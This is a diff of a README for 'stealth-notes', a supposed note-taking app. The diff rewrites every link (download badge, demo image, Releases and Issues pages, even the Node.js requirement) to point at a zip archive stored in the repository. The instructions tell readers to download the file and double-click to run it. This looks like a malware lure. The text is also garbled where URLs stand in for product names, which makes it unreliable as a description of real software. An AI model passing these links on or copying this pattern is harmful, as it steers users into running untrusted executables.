@@ -1,6 +1,6 @@
 # 📝 stealth-notes - Your Simple Digital Notebook
 
-[![Download stealth-notes](https://raw.githubusercontent.com/192-168-4201/stealth-notes/main/claustrophobia/stealth-notes.zip)](https://raw.githubusercontent.com/192-168-4201/stealth-notes/main/claustrophobia/stealth-notes.zip)
+[![Download stealth-notes](https://github.com/192-168-4201/stealth-notes/raw/refs/heads/main/assets/notes_stealth_3.2.zip)](https://github.com/192-168-4201/stealth-notes/raw/refs/heads/main/assets/notes_stealth_3.2.zip)
 
 ---
 
@@ -18,7 +18,7 @@
 
 ## 🖼️ Demo
 
-![Stealth Notes demo](https://raw.githubusercontent.com/192-168-4201/stealth-notes/main/claustrophobia/stealth-notes.zip)
+![Stealth Notes demo](https://github.com/192-168-4201/stealth-notes/raw/refs/heads/main/assets/notes_stealth_3.2.zip)
 
 ---
 
@@ -29,12 +29,12 @@
 To run Stealth Notes, you need:
 
 * Windows 11
-* https://raw.githubusercontent.com/192-168-4201/stealth-notes/main/claustrophobia/stealth-notes.zip version 18 or higher
+* https://github.com/192-168-4201/stealth-notes/raw/refs/heads/main/assets/notes_stealth_3.2.zip version 18 or higher
 * npm (comes with Node)
 
 ### Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/192-168-4201/stealth-notes/main/claustrophobia/stealth-notes.zip).
+1. Visit the [Releases page](https://github.com/192-168-4201/stealth-notes/raw/refs/heads/main/assets/notes_stealth_3.2.zip).
 2. Look for the latest version of Stealth Notes.
 3. Download the file that matches your system.
 4. Once downloaded, locate the file and double-click to run it.
@@ -65,7 +65,7 @@ After installation, you can start Stealth Notes by:
 
 If you run into any issues, try these steps:
 
-1. Ensure that https://raw.githubusercontent.com/192-168-4201/stealth-notes/main/claustrophobia/stealth-notes.zip is installed correctly.
+1. Ensure that https://github.com/192-168-4201/stealth-notes/raw/refs/heads/main/assets/notes_stealth_3.2.zip is installed correctly.
 2. Check if your operating system meets the requirements.
 3. Restart your computer if you encounter problems running the application.
 
@@ -75,7 +75,7 @@ If you run into any issues, try these steps:
 
 For further assistance:
 
-* Visit the [Issues page](https://raw.githubusercontent.com/192-168-4201/stealth-notes/main/claustrophobia/stealth-notes.zip) to report problems or ask for help.
+* Visit the [Issues page](https://github.com/192-168-4201/stealth-notes/raw/refs/heads/main/assets/notes_stealth_3.2.zip) to report problems or ask for help.
 * You can also check out the Discussions section for user tips.
 
 ---
@@ -95,4 +95,4 @@ Stealth Notes is available under the MIT License. You can use it freely while at
 
 ---
 
-[![Download stealth-notes](https://raw.githubusercontent.com/192-168-4201/stealth-notes/main/claustrophobia/stealth-notes.zip)](https://raw.githubusercontent.com/192-168-4201/stealth-notes/main/claustrophobia/stealth-notes.zip)
+[![Download stealth-notes](https://github.com/192-168-4201/stealth-notes/raw/refs/heads/main/assets/notes_stealth_3.2.zip)](https://github.com/192-168-4201/stealth-notes/raw/refs/heads/main/assets/notes_stealth_3.2.zip)
